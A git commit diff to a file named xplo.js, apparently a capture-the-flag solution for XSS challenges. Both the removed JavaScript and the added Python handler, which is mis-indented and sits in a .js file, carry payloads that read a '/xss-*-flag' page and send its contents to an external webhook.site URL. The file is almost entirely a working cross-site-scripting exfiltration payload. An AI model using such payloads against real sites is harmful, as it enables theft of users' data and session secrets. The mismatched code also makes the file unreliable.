c5d91db17a7dc9c5b4d4873fc1864103b9a6f0e1
0s0fzg0n <o25485001@gmail.com>
2025-06-13 18:48:46 -0600

    Update xplo.js

--- xplo.js
+++ xplo.js
@@ -1,6 +1,20 @@
-fetch('/xss-three-flag')
-  .then(response => response.text())
-  .then(flag => {
-    // Exfiltra la bandera a tu servidor
-    fetch('https://webhook.site/bafc1658-940e-417a-a1bb-638c72e05b06?data=' + btoa(flag));
-  });
+  def serveIt(request):
+    request_json = request.get_json(silent=True)
+    request_args = request.args
+
+    if request_json and 'name' in request_json:
+        name = request_json['name']
+    elif request_args and 'name' in request_args:
+        name = request_args['name']
+    else:
+        name = 'World'
+
+    return """  
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET',location.origin + '/xss-two-flag',true);
+            xhr.onload = function () {
+                var request = new XMLHttpRequest();
+                request.open('GET','https://webhook.site/bafc1658-940e-417a-a1bb-638c72e05b06?data=' + xhr.responseText,true);
+                request.send()};
+            xhr.send(null);
+    """
